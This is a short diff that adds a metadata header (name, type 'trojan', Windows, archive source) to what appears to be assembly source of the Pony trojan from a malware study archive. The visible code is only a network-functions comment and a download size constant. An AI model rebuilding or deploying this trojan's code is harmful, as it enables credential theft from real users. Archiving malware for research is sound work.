@@ -1,3 +1,14 @@
+; ------------------------------------------------------------
+; name      Pony
+; type      trojan
+; cve       —
+; year      unknown
+; os        Windows
+; authors   unknown
+; source    RamadhanAmizudin/malware
+; archived  RamadhanAmizudin, krisyotam (2026)
+; notes     —
+; ------------------------------------------------------------
 ; Network functions
 
 DOWN_LIMIT		equ	10*1024*1024
